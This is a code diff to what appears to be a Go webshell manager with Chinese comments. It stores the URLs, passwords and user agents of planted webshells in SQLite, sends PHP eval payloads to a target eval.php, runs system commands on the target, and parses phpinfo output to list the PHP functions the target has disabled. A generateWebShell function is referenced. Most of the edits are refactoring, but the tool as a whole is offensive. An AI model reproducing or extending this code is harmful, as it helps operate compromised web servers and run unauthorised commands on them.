@@ -20,6 +20,13 @@ const (
 	httpURL     = "http://test.test/eval.php"
 )
 
+// handleError 函数用于处理错误，打印错误消息
+func handleError(err error, message string) {
+	if err != nil {
+		log.Fatalf("%s: %v", message, err)
+	}
+}
+
 func addURL() {
 	var url, passwd, ua, other string
 	fmt.Printf("输入添加的url:\t")
@@ -32,9 +39,10 @@ func addURL() {
 	fmt.Scanln(&other)
 	db, err := connectDb()
 	handleError(err, "连接数据库出错!")
-	defer func(db *sql.DB) {
-		_ = db.Close()
-	}(db)
+	//defer func(db *sql.DB) {
+	//	_ = db.Close()
+	//}(db)
+	defer db.Close()
 	insertDataSQL := `
     INSERT INTO info (url, passwd, ua, other) VALUES (?, ?, ?, ?);`
 	_, err = db.Exec(insertDataSQL, url, passwd, ua, other)
@@ -51,22 +59,18 @@ func connectDb() (*sql.DB, error) {
 	return db, nil
 }
 
-// handleError 函数用于处理错误，打印错误消息
-func handleError(err error, message string) {
-	if err != nil {
-		fmt.Printf("%s: %v\n", message, err)
-		log.Fatal(err)
-	}
-}
-
 func selectDb() {
 	db, err := sql.Open("sqlite3", "test.db")
 	handleError(err, "打开数据库错误!")
-	defer db.Close()
+	defer func(db *sql.DB) {
+		_ = db.Close()
+	}(db)
 
 	rows, err := db.Query("select id, url, passwd, ua from info;")
 	handleError(err, "查询数据库错误!")
-	defer rows.Close()
+	defer func(rows *sql.Rows) {
+		_ = rows.Close()
+	}(rows)
 
 	for rows.Next() {
 		var id int
@@ -92,7 +96,9 @@ func checkFile() {
 func createTable() {
 	db, err := sql.Open("sqlite3", "test.db")
 	handleError(err, "打开数据库错误!")
-	defer db.Close()
+	defer func(db *sql.DB) {
+		_ = db.Close()
+	}(db)
 
 	createTableSQL := `
     CREATE TABLE IF NOT EXISTS info (
@@ -143,45 +149,69 @@ func shellExec(payload string) {
 
 	if string(bodyShell) != "" {
 		fmt.Println("执行系统命令响应:")
-		fmt.Println(string(bodyShell))
+		fmt.Printf("%s", bodyShell)
 
 	}
 	//return string(bodyShell)
 }
 
 func phpinfo() {
-	text := executeCode("phpinfo()")
-	re, err := regexp.Compile(`disable_functions</td><td class="v"> .* </td>`)
+	// 保存当前的标准输出
+	oldStdout := os.Stdout
 
-	handleError(err, "正则表达式编译错误!")
-	result := re.FindAllString(text, -1)
-	fmt.Println("匹配的结果:")
-	for _, match := range result {
-		fmt.Println(match)
+	// 创建一个黑洞，将标准输出重定向到黑洞
+	null, _ := os.Create(os.DevNull)
+	os.Stdout = null
+
+	// 执行函数
+	textPtr, err := executeCode("phpinfo()")
+	handleError(err, "执行phpinfo失败")
+	text := *textPtr
+	// 在这里不会将输出打印到终端
+	// 恢复标准输出
+	os.Stdout = oldStdout
+	//text := executeCode("phpinfo()")
+	//fmt.Println(executeCode("phpinfo()"))
+	//re, err := regexp.Compile(`disable_functions</td><td class="v">(.*?)</td>`)
+	//
+	//handleError(err, "正则表达式编译错误!")
+	//result := re.FindAllString(text, -1)
+	//fmt.Println("匹配的结果:")
+	//for _, match := range result {
+	//	content := match[1]
+	//	cleanedContent := strings.TrimSpace(content)
+	//	fmt.Println(cleanedContent)
+	//}
+	//编译表达式
+	re := regexp.MustCompile(`disable_functions</td><td class="v">(.*?)</td>`)
+	matches := re.FindAllStringSubmatch(text, -1)
+	// 提取匹配项的内容并输出
+	for _, match := range matches {
+		// 提取匹配项中的第一个子匹配组（即，<td class="v"> 和 </td> 之间的内容）
+		content := match[1]
+		//去空
+		cleanedContent := strings.TrimSpace(content)
+		fmt.Println("过滤了如下函数:\t", cleanedContent)
 	}
 }
 
-func executeCode(payload string) string {
+func executeCode(payload string) (*string, error) {
 	evalPayload := "cmd=" + payload + ";"
 	// 使用 makeRequest 发送 PHP 代码执行请求
 	respEval, err := makeRequest(evalPayload)
-
 	handleError(err, "发送payload失败!")
-	// 延迟关闭响应体
 	defer func(body io.ReadCloser) {
 		err := body.Close()
 		handleError(err, "关闭响应失败!")
 	}(respEval.Body)
-
-	// 读取和打印 PHP 代码执行响应
 	bodyEval, err := io.ReadAll(respEval.Body)
 	handleError(err, "打印php响应失败! ")
-
-	if string(bodyEval) != "" {
+	strbody := string(bodyEval)
+	if strbody != "" {
 		fmt.Println("执行代码响应:")
-		fmt.Println(string(bodyEval))
+		fmt.Printf("%s", bodyEval)
 	}
-	return string(bodyEval)
+	return &strbody, nil
 }
 
 func generateWebShell() {
